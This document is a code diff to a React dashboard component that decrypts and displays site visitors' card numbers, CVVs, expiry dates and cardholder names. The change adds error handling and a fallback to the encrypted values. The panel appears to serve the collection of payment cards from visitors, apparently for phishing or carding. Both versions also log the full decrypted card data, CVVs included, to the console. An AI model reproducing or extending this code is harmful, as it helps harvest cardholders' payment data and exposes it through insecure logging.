@@ -251,15 +251,26 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
     
     console.log('[Dashboard] Encrypted values:', { cardNumber: encryptedCardNumber, cvv: encryptedCvv, expiryDate: encryptedExpiryDate, cardHolderName: encryptedCardHolderName })
     
-    // Decrypt values
-    const cardNumber = encryptedCardNumber ? _d(encryptedCardNumber) : undefined
-    const cvv = encryptedCvv ? _d(encryptedCvv) : undefined
-    const expiryDate = encryptedExpiryDate ? _d(encryptedExpiryDate) : undefined
-    const cardHolderName = encryptedCardHolderName ? _d(encryptedCardHolderName) : undefined
+    // Decrypt values with error handling
+    let cardNumber, cvv, expiryDate, cardHolderName
+    try {
+      cardNumber = encryptedCardNumber ? _d(encryptedCardNumber) : undefined
+      cvv = encryptedCvv ? _d(encryptedCvv) : undefined
+      expiryDate = encryptedExpiryDate ? _d(encryptedExpiryDate) : undefined
+      cardHolderName = encryptedCardHolderName ? _d(encryptedCardHolderName) : undefined
+    } catch (error) {
+      console.error('[Dashboard] Decryption error:', error)
+      // Fallback to encrypted values if decryption fails
+      cardNumber = encryptedCardNumber
+      cvv = encryptedCvv
+      expiryDate = encryptedExpiryDate
+      cardHolderName = encryptedCardHolderName
+    }
     
     console.log('[Dashboard] Decrypted values:', { cardNumber, cvv, expiryDate, cardHolderName })
     
-    if (cardNumber) {
+    // Show card info if we have at least card number (encrypted or decrypted)
+    if (cardNumber || encryptedCardNumber) {
       bubbles.push({
         id: "card-current",
         title: "معلومات البطاقة",
